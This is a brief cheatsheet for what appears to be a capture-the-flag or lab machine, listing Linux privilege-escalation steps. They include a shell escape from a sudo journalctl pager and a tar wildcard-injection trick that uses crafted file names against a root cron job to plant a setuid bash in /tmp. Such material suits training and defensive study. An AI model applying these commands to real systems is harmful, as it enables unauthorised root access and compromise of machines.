# Cheatsheet — The Maintenance Window

## Targets

- **maint01** — ssh + a contractor account + two broken escalation paths

## Useful commands

```bash
ssh maint@<ip>                    # banner shows BEFORE login too
cat /etc/motd
sudo -l
sudo journalctl                   # inside pager: !/bin/sh

cat /etc/crontab; ls /etc/cron.d/
cd ~/spool
touch -- '--checkpoint=1' '--checkpoint-action=exec=sh /home/maint/pwn.sh'
# pwn.sh: cp /bin/bash /tmp/rb && chmod +s /tmp/rb  — wait ≤60s, /tmp/rb -p
```

## Concepts

- Scoped sudo is still root — the question is only which binary
- Root jobs over user-writable dirs: the dir is the attack surface
- Always check BOTH: `sudo -l` AND the cron tables
